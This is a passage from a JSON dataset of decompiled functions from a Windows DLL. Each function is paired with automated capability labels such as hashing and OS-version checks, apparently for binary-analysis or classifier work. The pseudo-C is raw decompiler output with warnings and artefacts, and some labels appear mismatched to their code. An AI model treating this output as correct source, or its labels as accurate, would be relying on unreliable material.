        "decompiled_code": "\nvoid fcn.180066100(ulong noname_0, uint32_t *arg2, ulong arg3, int64_t arg4)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t *puVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t *puVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint32_t *in_stack_00000028;\n    uint32_t uStack216;\n    uint32_t uStack212;\n    uint32_t uStack208;\n    uint32_t uStack204;\n    uint32_t uStack200;\n    uint32_t uStack196;\n    uint32_t uStack192;\n    uint32_t uStack188;\n    uint32_t uStack184;\n    uint32_t uStack180;\n    uint32_t uStack176;\n    uint32_t uStack172;\n    uint32_t uStack168;\n    uint32_t uStack164;\n    uint32_t uStack160;\n    uint32_t uStack156;\n    uint32_t uStack152;\n    uint32_t uStack148;\n    uint32_t uStack144;\n    uint32_t uStack140;\n    uint64_t uStack136;\n    int64_t iStack128;\n    uint64_t uStack120;\n    uint32_t auStack104 [8];\n    uint64_t uStack72;\n    \n    uStack72 = *0x180123080 ^ &uStack216;\n    uStack148 = *(arg4 + 0x400);\n    uStack164 = *in_stack_00000028;\n    uStack212 = in_stack_00000028[3];\n    uStack208 = in_stack_00000028[0xd];\n    uStack200 = in_stack_00000028[1];\n    uStack160 = in_stack_00000028[2];\n    uStack216 = in_stack_00000028[4];\n    uStack176 = in_stack_00000028[5];\n    uStack172 = in_stack_00000028[6];\n    uStack168 = in_stack_00000028[7];\n    uStack156 = in_stack_00000028[8];\n    uStack184 = in_stack_00000028[9];\n    uStack180 = in_stack_00000028[10];\n    uStack188 = in_stack_00000028[0xb];\n    uStack192 = in_stack_00000028[0x10];\n    uStack196 = in_stack_00000028[0xe];\n    uVar7 = in_stack_00000028[0xc];\n    uVar17 = in_stack_00000028[0xf];\n    if (arg3 != 0) {\n        puVar1 = auStack104;\n        if (arg2 != NULL) {\n            puVar1 = arg2;\n        }\n        uStack120 = -(arg2 != NULL) & 0x20;\n        uStack136 = arg3;\n        do {\n            *puVar1 = *0x18012aff0 ^ uStack184;\n            puVar1[1] = *0x18012aff4 ^ uStack180;\n            puVar1[2] = *0x18012aff8 ^ uStack188;\n            puVar1[3] = *0x18012affc ^ uVar7;\n            puVar1[4] = *0x18012b000 ^ uStack208;\n            puVar1[5] = *0x18012b004 ^ uStack196;\n            puVar1[6] = *0x18012b008 ^ uVar17;\n            puVar1[7] = *0x18012b00c ^ uStack192;\n            puVar1 = puVar1 + uStack120;\n            uStack144 = (~uStack160 | uStack200) ^ uStack164;\n            uVar2 = (~uStack184 | uStack156) ^ uStack168;\n            uStack140 = uVar2 << 1 | uVar2 < 0;\n            uVar2 = (~uStack168 | uStack172) ^ uStack176;\n            uVar14 = uVar2 << 4 | uVar2 >> 0x1c;\n            uVar2 = (~uStack192 | uVar17) ^ uStack196;\n            uStack152 = uVar2 << 3 | uVar2 >> 0x1d;\n            uVar2 = (~uStack172 | uStack176) ^ uStack216;\n            uVar2 = uVar2 << 6 | uVar2 >> 0x1a;\n            uVar3 = (~uStack208 | uVar7) ^ uStack188;\n            uVar3 = uVar3 << 10 | uVar3 >> 0x16;\n            uVar4 = (~uStack212 | uStack160) ^ uStack200;\n            uVar4 = uVar4 << 0xf | uVar4 >> 0x11;\n            uVar5 = (~uStack180 | uStack184) ^ uStack156;\n            uVar5 = uVar5 >> 0xb | uVar5 << 0x15;\n            uVar15 = (~uStack164 | uStack192) ^ uVar17;\n            uVar16 = uVar15 >> 4 | uVar15 << 0x1c;\n            uVar15 = (~uStack196 | uStack208) ^ uVar7;\n            uVar19 = uVar15 << 0xd | uVar15 >> 0x13;\n            uStack208 = (~uVar17 | uStack196) ^ uStack208;\n            uVar9 = uStack208 << 9 | uStack208 >> 0x17;\n            uVar17 = (~uStack216 | uStack212) ^ uStack160;\n            uVar18 = uVar17 >> 9 | uVar17 << 0x17;\n            uStack184 = (~uStack188 | uStack180) ^ uStack184;\n            uStack180 = uStack180 ^ (~uVar7 | uStack188);\n            uStack188 = uStack184 << 2 | uStack184 >> 0x1e;\n            uVar13 = uStack180 << 8 | uStack180 >> 0x18;\n            puVar11 = (uStack148 + 4 & 0x1f) * 0x20 + arg4;\n            uVar17 = (~uStack156 | uStack168) ^ uStack172;\n            uStack192 = (~uStack200 | uStack164) ^ uStack192;\n            uVar7 = (~uStack176 | uStack216) ^ uStack212;\n            puVar12 = (uStack148 - 0x10 & 0x1f) * 0x20 + arg4;\n            uVar8 = uVar17 >> 5 | uVar17 << 0x1b;\n            uVar15 = uStack192 << 0xe | uStack192 >> 0x12;\n            uVar17 = uVar7 >> 8 | uVar7 << 0x18;\n            uStack148 = uStack148 - 1 & 0x1f;\n            puVar10 = uStack148 * 0x20 + arg4;\n            puVar6 = (uStack148 - 7 & 0x1f) * 0x20 + arg4;\n            *puVar6 = *puVar6 ^ puVar10[2];\n            puVar6[1] = puVar6[1] ^ puVar10[3];\n            puVar6[2] = puVar6[2] ^ puVar10[4];\n            puVar6[3] = puVar6[3] ^ puVar10[5];\n            puVar6[4] = puVar6[4] ^ puVar10[6];\n            puVar6[5] = puVar6[5] ^ puVar10[7];\n            puVar6[6] = puVar6[6] ^ *puVar10;\n            puVar6[7] = puVar6[7] ^ puVar10[1];\n            *puVar10 = *puVar10 ^ uStack200;\n            puVar10[1] = puVar10[1] ^ uStack160;\n            puVar10[2] = puVar10[2] ^ uStack212;\n            puVar10[3] = puVar10[3] ^ uStack216;\n            puVar10[4] = puVar10[4] ^ uStack176;\n            puVar10[5] = puVar10[5] ^ uStack172;\n            puVar10[6] = puVar10[6] ^ uStack168;\n            puVar10[7] = puVar10[7] ^ uStack156;\n            uStack200 = uVar4 ^ uStack152 ^ uStack140 ^ *puVar11;\n            uStack164 = uVar3 ^ uStack140 ^ uStack144 ^ 1;\n            uStack160 = puVar11[1] ^ uVar5 ^ uVar2 ^ uStack152;\n            uStack212 = puVar11[2] ^ uVar16 ^ uVar3 ^ uVar2;\n            uStack216 = puVar11[3] ^ uVar14 ^ uVar4 ^ uVar3;\n            uStack176 = puVar11[4] ^ uVar19 ^ uVar5 ^ uVar4;\n            uStack172 = puVar11[5] ^ uVar18 ^ uVar16 ^ uVar5;\n            uStack168 = puVar11[6] ^ uStack188 ^ uVar14 ^ uVar16;\n            uStack156 = puVar11[7] ^ uVar15 ^ uVar19 ^ uVar14;\n            uStack184 = *puVar12 ^ uVar8 ^ uVar18 ^ uVar19;\n            uVar7 = puVar12[3] ^ uVar13 ^ uVar8 ^ uVar15;\n            uStack180 = puVar12[1] ^ uVar9 ^ uStack188 ^ uVar18;\n            uStack188 = puVar12[2] ^ uVar17 ^ uVar15 ^ uStack188;\n            uStack208 = puVar12[4] ^ uVar9 ^ uVar8 ^ uStack144;\n            uStack196 = puVar12[5] ^ uVar17 ^ uVar9 ^ uStack140;\n            uStack192 = puVar12[7] ^ uVar13 ^ uVar2 ^ uStack144;\n            uVar17 = puVar12[6] ^ uVar13 ^ uVar17 ^ uStack152;\n            uStack136 = uStack136 - 1;\n            uStack204 = uVar7;\n        } while (uStack136 != 0);\n    }\n    *(arg4 + 0x400) = uStack148;\n    *in_stack_00000028 = uStack164;\n    in_stack_00000028[0xc] = uVar7;\n    in_stack_00000028[9] = uStack184;\n    in_stack_00000028[0xd] = uStack208;\n    in_stack_00000028[10] = uStack180;\n    in_stack_00000028[0xe] = uStack196;\n    in_stack_00000028[0xb] = uStack188;\n    in_stack_00000028[0x10] = uStack192;\n    in_stack_00000028[1] = uStack200;\n    in_stack_00000028[2] = uStack160;\n    in_stack_00000028[3] = uStack212;\n    in_stack_00000028[4] = uStack216;\n    in_stack_00000028[5] = uStack176;\n    in_stack_00000028[6] = uStack172;\n    in_stack_00000028[7] = uStack168;\n    in_stack_00000028[8] = uStack156;\n    in_stack_00000028[0xf] = uVar17;\n    iStack128 = arg4;\n    fcn.18008fb00(uStack72 ^ &uStack216);\n    return;\n}\n",
        "token_count": 2754
    },
    "18006666": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nvoid fcn.180066660(int64_t arg1, ulong arg2, int64_t arg3, uint32_t *arg4)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t *puVar6;\n    uint32_t *puVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t *puVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    uint32_t uVar22;\n    uint32_t uVar23;\n    uint32_t uStackX16;\n    uint32_t uStack168;\n    uint32_t uStack164;\n    uint32_t uStack160;\n    uint32_t uStack156;\n    uint32_t uStack152;\n    uint32_t uStack148;\n    uint32_t uStack144;\n    uint32_t uStack140;\n    uint32_t uStack136;\n    uint32_t uStack116;\n    uint32_t *puStack96;\n    uint64_t uStack88;\n    \n    uStack168 = arg4[3];\n    uStackX16 = arg4[4];\n    uStack116 = *(arg3 + 0x400);\n    uStack160 = arg4[2];\n    uStack140 = arg4[6];\n    uVar21 = arg4[7];\n    uVar9 = arg4[9];\n    uStack144 = arg4[0xc];\n    uVar13 = *arg4;\n    uVar14 = arg4[1];\n    uVar4 = arg4[5];\n    uVar8 = arg4[8];\n    uStack156 = arg4[10];\n    uStack136 = arg4[0xb];\n    uStack152 = arg4[0xd];\n    uStack148 = arg4[0xe];\n    uStack164 = arg4[0x10];\n    uVar3 = arg4[0xf];\n    if (arg2 != 0) {\n        puStack96 = arg1 + 8;\n        uStack88 = arg2;\n        do {\n            uVar1 = (~uStack160 | uVar14) ^ uVar13;\n            uVar2 = (~uVar9 | uVar8) ^ uVar21;\n            uVar2 = uVar2 << 1 | uVar2 < 0;\n            uVar19 = (~uStack156 | uVar9) ^ uVar8;\n            uVar20 = uVar19 >> 0xb | uVar19 << 0x15;\n            uVar19 = (~uStack164 | uVar3) ^ uStack148;\n            uVar17 = (~uVar13 | uStack164) ^ uVar3;\n            uVar8 = (~uVar8 | uVar21) ^ uStack140;\n            uVar5 = (~uVar3 | uStack148) ^ uStack152;\n            uVar3 = uVar19 << 3 | uVar19 >> 0x1d;\n            uVar18 = uVar17 >> 4 | uVar17 << 0x1c;\n            uVar17 = uVar8 >> 5 | uVar8 << 0x1b;\n            uVar8 = (~uStack140 | uVar4) ^ uStackX16;\n            uVar19 = uVar8 << 6 | uVar8 >> 0x1a;\n            uVar21 = (~uVar21 | uStack140) ^ uVar4;\n            uVar8 = uVar21 << 4 | uVar21 >> 0x1c;\n            uVar21 = (~uStack152 | uStack144) ^ uStack136;\n            uVar22 = (~uStack148 | uStack152) ^ uStack144;\n            uVar9 = (~uStack136 | uStack156) ^ uVar9;\n            uVar21 = uVar21 << 10 | uVar21 >> 0x16;\n            uVar23 = uVar22 << 0xd | uVar22 >> 0x13;\n            uVar10 = uVar9 << 2 | uVar9 >> 0x1e;\n            uVar9 = (~uStack168 | uStack160) ^ uVar14;\n            uVar9 = uVar9 << 0xf | uVar9 >> 0x11;\n            uStack160 = (~uStackX16 | uStack168) ^ uStack160;\n            uVar22 = uStack160 >> 9 | uStack160 << 0x17;\n            uStack164 = (uVar13 | ~uVar14) ^ uStack164;\n            uVar11 = uStack164 << 0xe | uStack164 >> 0x12;\n            uVar5 = uVar5 << 9 | uVar5 >> 0x17;\n            uStack168 = (~uVar4 | uStackX16) ^ uStack168;\n            uVar16 = uStack168 >> 8 | uStack168 << 0x18;\n            uStack156 = (uStack136 | ~uStack144) ^ uStack156;\n            uVar15 = uStack156 << 8 | uStack156 >> 0x18;\n            puVar12 = (uStack116 - 0x10 & 0x1f) * 0x20 + arg3;\n            uStack116 = uStack116 - 1 & 0x1f;\n            puVar7 = uStack116 * 0x20 + arg3;\n            puVar6 = (uStack116 - 7 & 0x1f) * 0x20 + arg3;\n            *puVar6 = *puVar6 ^ puVar7[2];\n            uVar13 = uVar21 ^ uVar2 ^ uVar1 ^ 1;\n            puVar6[1] = puVar6[1] ^ puVar7[3];\n            puVar6[2] = puVar6[2] ^ puVar7[4];\n            puVar6[3] = puVar6[3] ^ puVar7[5];\n            puVar6[4] = puVar6[4] ^ puVar7[6];\n            puVar6[5] = puVar6[5] ^ puVar7[7];\n            puVar6[6] = puVar6[6] ^ *puVar7;\n            puVar6[7] = puVar6[7] ^ puVar7[1];\n            *puVar7 = *puVar7 ^ puStack96[-2];\n            puVar7[1] = puVar7[1] ^ puStack96[-1];\n            puVar7[2] = puVar7[2] ^ *puStack96;\n            puVar7[3] = puVar7[3] ^ puStack96[1];\n            puVar7[4] = puVar7[4] ^ puStack96[2];\n            puVar7[5] = puVar7[5] ^ puStack96[3];\n            puVar7[6] = puVar7[6] ^ puStack96[4];\n            puVar7[7] = puVar7[7] ^ puStack96[5];\n            uVar14 = puStack96[-2] ^ uVar9 ^ uVar3 ^ uVar2;\n            uStack160 = puStack96[-1] ^ uVar20 ^ uVar19 ^ uVar3;\n            uStack168 = *puStack96 ^ uVar18 ^ uVar21 ^ uVar19;\n            uStackX16 = uVar8 ^ uVar9 ^ uVar21 ^ puStack96[1];\n            uVar4 = puStack96[2] ^ uVar23 ^ uVar20 ^ uVar9;\n            uStack140 = puStack96[3] ^ uVar22 ^ uVar18 ^ uVar20;\n            uVar21 = puStack96[4] ^ uVar10 ^ uVar8 ^ uVar18;\n            uVar8 = uVar11 ^ uVar23 ^ uVar8 ^ puStack96[5];\n            uVar9 = *puVar12 ^ uVar17 ^ uVar22 ^ uVar23;\n            puStack96 = puStack96 + 8;\n            uStack156 = puVar12[1] ^ uVar5 ^ uVar10 ^ uVar22;\n            uStack136 = puVar12[2] ^ uVar16 ^ uVar11 ^ uVar10;\n            uStack144 = puVar12[3] ^ uVar15 ^ uVar17 ^ uVar11;\n            uStack152 = puVar12[4] ^ uVar5 ^ uVar17 ^ uVar1;\n            uStack148 = puVar12[5] ^ uVar16 ^ uVar5 ^ uVar2;\n            uVar3 = puVar12[6] ^ uVar15 ^ uVar16 ^ uVar3;\n            uStack164 = puVar12[7] ^ uVar15 ^ uVar19 ^ uVar1;\n            uStack88 = uStack88 - 1;\n        } while (uStack88 != 0);\n    }\n    *(arg3 + 0x400) = uStack116;\n    arg4[3] = uStack168;\n    arg4[10] = uStack156;\n    arg4[0xb] = uStack136;\n    arg4[0xd] = uStack152;\n    arg4[0xe] = uStack148;\n    arg4[0x10] = uStack164;\n    *arg4 = uVar13;\n    arg4[1] = uVar14;\n    arg4[2] = uStack160;\n    arg4[4] = uStackX16;\n    arg4[5] = uVar4;\n    arg4[6] = uStack140;\n    arg4[7] = uVar21;\n    arg4[8] = uVar8;\n    arg4[9] = uVar9;\n    arg4[0xc] = uStack144;\n    arg4[0xf] = uVar3;\n    return;\n}\n",
        "token_count": 2288
    },
    "180016d0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489",
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid fcn.180016d00(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    int64_t *piVar2;\n    code *pcVar3;\n    uchar auVar4 [16];\n    uint32_t uVar5;\n    uchar (*pauVar6) [16];\n    int64_t iVar7;\n    ulong arg2;\n    int64_t iVar8;\n    ushort in_DX;\n    \n    if ((*(*(arg1 + 8) + 8) != 6) || ((*(*(arg1 + 8) + 0xc) & 4) != 0)) {\n        pauVar6 = fcn.18008fb2c(0x30);\n        *pauVar6 = ZEXT816(0);\n        pauVar6[1] = ZEXT816(0);\n        pauVar6[2] = ZEXT816(0);\n        *(*pauVar6 + 8) = 6;\n        *pauVar6[1] = 0;\n        *(pauVar6[1] + 8) = 0;\n        **pauVar6 = vtable.std::_Node_str_wchar_t_.0;\n        *pauVar6[2] = 0;\n        *(pauVar6[2] + 8) = 0;\n        *(pauVar6[1] + 8) = *(arg1 + 8);\n        iVar7 = *(arg1 + 8);\n        if (*(iVar7 + 0x10) != 0) {\n            *pauVar6[1] = *(iVar7 + 0x10);\n            *(*(*(arg1 + 8) + 0x10) + 0x18) = pauVar6;\n            iVar7 = *(arg1 + 8);\n        }\n        *(iVar7 + 0x10) = pauVar6;\n        *(arg1 + 8) = pauVar6;\n    }\n    if ((*(arg1 + 0x10) >> 8 & 1) == 0) {\n        if ((*(arg1 + 0x10) >> 0xb & 1) != 0) {\n            in_DX = fcn.180017ba0(*(arg1 + 0x18));\n        }\n    }\n    else {\n        piVar2 = *(*(arg1 + 0x18) + 8);\n        in_DX = (**(*piVar2 + 0x40))(piVar2, in_DX);\n    }\n    iVar7 = *(arg1 + 8);\n    uVar5 = *(iVar7 + 0x24);\n    if (*(iVar7 + 0x20) < uVar5 || *(iVar7 + 0x20) == uVar5) {\n        uVar1 = uVar5 + 0x10;\n        auVar4 = ZEXT816(2) * ZEXT416(uVar1);\n        arg2 = SUB168(auVar4, 0);\n        if (SUB168(auVar4 >> 0x40, 0) != 0) {\n            arg2 = 0xffffffffffffffff;\n        }\n        iVar8 = fcn.1800b15d0(*(iVar7 + 0x28), arg2);\n        if (iVar8 == 0) {\n            fcn.18006df20();\n            pcVar3 = swi(3);\n            (*pcVar3)();\n            return;\n        }\n        *(iVar7 + 0x28) = iVar8;\n        uVar5 = *(iVar7 + 0x24);\n        *(iVar7 + 0x20) = uVar1;\n    }\n    *(*(iVar7 + 0x28) + uVar5 * 2) = in_DX;\n    *(iVar7 + 0x24) = *(iVar7 + 0x24) + 1;\n    return;\n}\n",
        "token_count": 838
    },
    "1800315f": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489",
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid fcn.1800315f0(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uchar (*pauVar4) [16];\n    int64_t iVar5;\n    int64_t iVar6;\n    uchar in_DL;\n    \n    if ((*(*(arg1 + 8) + 8) != 6) || ((*(*(arg1 + 8) + 0xc) & 4) != 0)) {\n        pauVar4 = fcn.18008fb2c(0x30);\n        *pauVar4 = ZEXT816(0);\n        pauVar4[1] = ZEXT816(0);\n        pauVar4[2] = ZEXT816(0);\n        *(*pauVar4 + 8) = 6;\n        *pauVar4[1] = 0;\n        *(pauVar4[1] + 8) = 0;\n        **pauVar4 = vtable.std::_Node_str_char_.0;\n        *pauVar4[2] = 0;\n        *(pauVar4[2] + 8) = 0;\n        *(pauVar4[1] + 8) = *(arg1 + 8);\n        iVar5 = *(arg1 + 8);\n        if (*(iVar5 + 0x10) != 0) {\n            *pauVar4[1] = *(iVar5 + 0x10);\n            *(*(*(arg1 + 8) + 0x10) + 0x18) = pauVar4;\n            iVar5 = *(arg1 + 8);\n        }\n        *(iVar5 + 0x10) = pauVar4;\n        *(arg1 + 8) = pauVar4;\n    }\n    if ((*(arg1 + 0x10) >> 8 & 1) == 0) {\n        if ((*(arg1 + 0x10) >> 0xb & 1) != 0) {\n            in_DL = fcn.1800323a0(*(arg1 + 0x18));\n        }\n    }\n    else {\n        in_DL = (**(**(*(arg1 + 0x18) + 8) + 0x20))();\n    }\n    iVar5 = *(arg1 + 8);\n    uVar3 = *(iVar5 + 0x24);\n    if (*(iVar5 + 0x20) < uVar3 || *(iVar5 + 0x20) == uVar3) {\n        uVar1 = uVar3 + 0x10;\n        iVar6 = fcn.1800b15d0(*(iVar5 + 0x28), uVar1);\n        if (iVar6 == 0) {\n            fcn.18006df20();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        *(iVar5 + 0x28) = iVar6;\n        uVar3 = *(iVar5 + 0x24);\n        *(iVar5 + 0x20) = uVar1;\n    }\n    *(uVar3 + *(iVar5 + 0x28)) = in_DL;\n    *(iVar5 + 0x24) = *(iVar5 + 0x24) + 1;\n    return;\n}\n",
        "token_count": 731
    },
    "18004130": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1fh\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Variable defined which should be unmapped: var_19h\n// WARNING: Variable defined which should be unmapped: var_21h\n// WARNING: Variable defined which should be unmapped: var_31h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180041300(int64_t arg1, int64_t *arg2)\n\n{\n    ulong *puVar1;\n    int64_t *arg1_00;\n    code *pcVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    ulong arg2_00;\n    uchar *puVar5;\n    ulong *arg1_01;\n    int64_t iVar6;\n    ulong *arg2_01;\n    uint64_t arg2_02;\n    int64_t iVar7;\n    uchar *puVar8;\n    int32_t iVar9;\n    int64_t iVar10;\n    uchar extraout_XMM0 [16];\n    ulong var_fh;\n    ulong var_17h;\n    ulong var_1fh;\n    uchar auStack312 [32];\n    uchar *puStack280;\n    uchar *puStack272;\n    uchar uStack264;\n    unkbyte7 Stack263;\n    int64_t iStack248;\n    uint64_t uStack240;\n    int32_t iStack232;\n    uchar uStack224;\n    unkbyte7 Stack223;\n    ulong uStack208;\n    uint64_t uStack200;\n    ulong uStack192;\n    int64_t *piStack184;\n    uchar uStack176;\n    unkbyte7 Stack175;\n    ulong uStack160;\n    uint64_t uStack152;\n    ushort uStack144;\n    unkbyte6 Stack142;\n    uchar auStack128 [7];\n    uint64_t var_71h;\n    ulong var_69h;\n    uchar *var_61h;\n    int64_t *var_59h;\n    int64_t var_51h;\n    ulong uStack80;\n    int64_t var_41h;\n    uint64_t var_39h;\n    ulong var_31h;\n    ulong var_21h;\n    ulong var_19h;\n    ulong var_11h;\n    ulong var_9h;\n    ulong var_1h;\n    \n    stack0xffffffffffffff90 = 0xfffffffffffffffe;\n    *NULL = *0x180123080 ^ auStack312;\n    iVar9 = 0;\n    unique0x10000120 = ZEXT816(0);\n    stack0xffffffffffffffb8 = 0;\n    uStack192 = &uStack224;\n    uStack208 = 0;\n    uStack200 = 0xf;\n    uStack224 = 0;\n    piStack184 = arg2;\n    unique0x10000583 = arg2;\n    fcn.180011120(&uStack224, 0x1800f4761, 0);\n    uStack160 = CONCAT44(*0x180101914, *0x180101910);\n    uStack152 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack176 = 0;\n    fcn.180011120(&uStack176, 0x1800f4762, 0);\n    iStack248 = CONCAT44(*0x180101914, *0x180101910);\n    uStack240 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack264 = 0;\n    puVar5 = &uStack264;\n    fcn.180011120(puVar5, 0x1800f8210, 0xb);\n    puStack272 = &uStack224;\n    puStack280 = &uStack176;\n    iVar4 = fcn.180009a40(puVar5, &var_51h + 1, arg2, &uStack264);\n    iStack232 = iVar4;\n    if (uStack240 < 0x10) {\ncode_r0x000180041441:\n        iStack248 = CONCAT44(*0x180101914, *0x180101910);\n        uStack240 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack264 = 0;\n        if (uStack152 < 0x10) {\ncode_r0x00018004148f:\n            arg1_00 = arg1 + 0xa8;\n            iVar10 = *(arg1 + 0xb0);\n            iVar7 = *arg1_00;\n            if (iVar7 != iVar10) {\n                do {\n                    fcn.180042e30(iVar7);\n                    iVar7 = iVar7 + 0x40;\n                } while (iVar7 != iVar10);\n                iVar7 = *arg1_00;\n            }\n            *(arg1 + 0xb0) = iVar7;\n            fcn.180048c70(arg1_00, iVar4);\n            iVar7 = 0;\n            iVar10 = iVar7;\n            if (0 < iVar4) {\n                do {\n                    arg2_01 = stack0xffffffffffffffa8 + iVar7;\n                    arg1_01 = *arg1_00 + iVar9 * 0x40;\n                    if (arg1_01 != arg2_01) {\n                        puVar1 = arg2_01 + 2;\n                        if (0xf < arg2_01[3]) {\n                            arg2_01 = *arg2_01;\n                        }\n                        fcn.180011120(arg1_01, arg2_01, *puVar1);\n                    }\n                    unique0x00003100 = &uStack176;\n                    uStack160 = 0;\n                    uStack152 = 0xf;\n                    uStack176 = 0;\n                    fcn.180011120(&uStack176, 0x1800f4763, 0);\n                    uStack208 = 0;\n                    uStack200 = 0xf;\n                    uStack224 = 0;\n                    fcn.180011120(&uStack224, 0x1800f4767, 0);\n                    iStack248 = 0;\n                    uStack240 = 0xf;\n                    uStack264 = 0;\n                    uStack192 = CONCAT44(uStack192._4_4_, 1);\n                    arg2_02 = *(stack0xffffffffffffffa8 + iVar7 + 0x10) + 6;\n                    if (0xf < arg2_02) {\n                        fcn.1800137f0(&uStack264, arg2_02);\n                    }\n                    iStack248 = 0;\n                    fcn.18000dc30(&uStack264, stack0xffffffffffffffa8 + iVar7);\n                    if (uStack240 - iStack248 < 6) {\n                        puStack280 = 0x6;\n                        puVar5 = &uStack264;\n                        fcn.180014270(puVar5, 6, 0, 0x1800f74b4);\n                    }\n                    else {\n                        puVar8 = &uStack264;\n                        if (0xf < uStack240) {\n                            puVar8 = CONCAT71(Stack263, uStack264);\n                        }\n                        puVar8 = puVar8 + iStack248;\n                        puVar5 = puVar8;\n                        iStack248 = iStack248 + 6;\n                        fcn.1800ade80(puVar8, 0x1800f74b4, 6);\n                        puVar8[6] = 0;\n                    }\n                    puStack272 = &uStack176;\n                    puStack280 = &uStack224;\n                    arg2_00 = fcn.180004f50(puVar5, &uStack144, piStack184, &uStack264);\n                    fcn.18000d960(*arg1_00 + 0x20 + iVar9 * 0x40, arg2_00);\n                    if (7 < stack0xffffffffffffff88) {\n                        iVar3 = CONCAT62(Stack142, uStack144);\n                        iVar6 = iVar3;\n                        if ((0xfff < stack0xffffffffffffff88 * 2 + 2) &&\n                           (iVar6 = *(iVar3 + -8),  0x1f < (iVar3 - iVar6) - 8U)) goto code_r0x000180041840;\n                        fcn.18008fb24(iVar6);\n                    }\n                    _auStack128 = 0;\n                    stack0xffffffffffffff88 = 7;\n                    uStack144 = 0;\n                    if (0xf < uStack240) {\n                        iVar3 = CONCAT71(Stack263, uStack264);\n                        iVar6 = iVar3;\n                        if ((0xfff < uStack240 + 1) && (iVar6 = *(iVar3 + -8),  0x1f < (iVar3 - iVar6) - 8U))\n                        goto code_r0x000180041846;\n                        fcn.18008fb24(iVar6);\n                    }\n                    iStack248 = 0;\n                    uStack240 = 0xf;\n                    uStack264 = 0;\n                    if (0xf < uStack200) {\n                        iVar3 = CONCAT71(Stack223, uStack224);\n                        iVar6 = iVar3;\n                        if (0xfff < uStack200 + 1) {\n                            iVar6 = *(iVar3 + -8);\n                            if (0x1f < (iVar3 - iVar6) - 8U) {\n                                fcn.1800b3528(iVar6, uStack200 + 0x28);\n                                goto code_r0x000180041828;\n                            }\n                        }\n                        fcn.18008fb24(iVar6);\n                    }\n                    iVar9 = iVar9 + 1;\n                    iVar10 = iVar10 + 1;\n                    iVar7 = iVar7 + 0x20;\n                    arg2 = piStack184;\n                } while (iVar10 < iStack232);\n            }\n            if (stack0xffffffffffffffa8 != 0) {\n                fcn.180013b30(stack0xffffffffffffffa8, uStack80);\n                iVar10 = stack0xffffffffffffffa8;\n                if ((0xfff < (stack0xffffffffffffffb8 - stack0xffffffffffffffa8 & 0xffffffffffffffe0U)) &&\n                   (iVar10 = *(stack0xffffffffffffffa8 + -8),  0x1f < (stack0xffffffffffffffa8 - iVar10) - 8U))\n                goto code_r0x00018004183a;\n                fcn.18008fb24(iVar10);\n                *0x1200 = extraout_XMM0 & 0x0;\n                stack0xffffffffffffffb8 = 0;\n            }\n            if (arg2[3] < 0x10) {\ncode_r0x0001800417e9:\n                arg2[2] = 0;\n                arg2[3] = 0xf;\n                *arg2 = 0;\n                fcn.18008fb00(stack0xffffffffffffffc0 ^ auStack312);\n                return;\n            }\n            iVar10 = *arg2;\n            iVar7 = iVar10;\n            if ((arg2[3] + 1U < 0x1000) || (iVar7 = *(iVar10 + -8),  (iVar10 - iVar7) - 8U < 0x20)) {\n                fcn.18008fb24(iVar7);\n                goto code_r0x0001800417e9;\n            }\ncode_r0x000180041828:\n            fcn.1800b3528();\n            goto code_r0x00018004182e;\n        }\n        iVar7 = CONCAT71(Stack175, uStack176);\n        iVar10 = iVar7;\n        if ((uStack152 + 1 < 0x1000) || (iVar10 = *(iVar7 + -8),  (iVar7 - iVar10) - 8U < 0x20)) {\n            fcn.18008fb24(iVar10);\n            goto code_r0x00018004148f;\n        }\n    }\n    else {\n        iVar7 = CONCAT71(Stack263, uStack264);\n        iVar10 = iVar7;\n        if ((uStack240 + 1 < 0x1000) || (iVar10 = *(iVar7 + -8),  (iVar7 - iVar10) - 8U < 0x20)) {\n            fcn.18008fb24(iVar10);\n            goto code_r0x000180041441;\n        }\ncode_r0x00018004182e:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x00018004183a:\n    fcn.1800b3528();\ncode_r0x000180041840:\n    fcn.1800b3528();\ncode_r0x000180041846:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 2884
    },
    "1800908b": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
